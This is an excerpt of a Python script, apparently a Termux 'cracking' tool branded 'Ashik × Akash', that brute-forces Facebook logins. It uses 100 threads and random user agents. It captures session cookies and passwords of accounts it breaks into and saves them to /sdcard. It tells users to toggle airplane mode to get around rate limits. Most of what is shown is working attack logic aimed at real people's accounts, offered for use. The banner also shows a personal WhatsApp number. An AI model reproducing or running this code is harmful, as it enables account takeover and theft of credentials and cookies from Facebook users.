...
os.system('git pull')
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100043415901630/')
time.sleep(2.00)
try:
    import requests
except ImportError:
...
def cek_apks(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            print(f"\r\r {K}[%s]{K} %s %s"%(i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
os.system('espeak -a 300 " Welcome,   to,  Ashik And Akash, Tools"')
os.system("clear")
#print(" \033[92;1m[Ã¢Å“â€œ] FOLLOW US ON GITHUB ")
#os.system("xdg-open https://github.com/ashik3037")
logo =""" 
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                 • \33[1;38mAshik × Akash \33[1;38m     \033[1;31m 
╠══[Facebook               • Ashik Hasan     \033[1;97m  
╠══[Github                 • \33[1;38mAshik-3037    \33[1;34m   
╠══[Whatsapp               • 01986766297   \33[1;35m 
╠══[TOOLS                  • Free           \33[1;32m   
...
def mathod1():
	...
	with ThreadPool(max_workers=100) as yaari:
		...
		print(' USE [\033[1;32mAIRPLANE\033[1;37m] MODE OFF/ON 100% Ok IDS')
...
def mathod2():
	...
	print(47*'\033[1;31m🖤\033[1;37m')
	print(' [\033[1;32m!\033[1;37m] Cracking Complete')
	print(' [\033[1;32m!\033[1;37m] Ok Ids Save [\033[1;32m 💗\033[1;37m] /sdcard/LIVE RANDOM 🔥.txt')
	print(47*'\033[1;31m🖤\033[1;37m')
	exit()
...
def m2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:        	            
            session = requests.Session()
            sys.stdout.write(f'\r [Active 🔥] - %s - %s - OK - [\033[1;32m%s\033[1;37m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [Active 🖤OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\33[35;1m [COOKIES] '+coki)
                cek_apk(session,coki)                
                open('/sdcard/Ashik  RANDOM OK 🔥.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\33[1;91m[Ashik💔 CP] {uid} | {ps}")
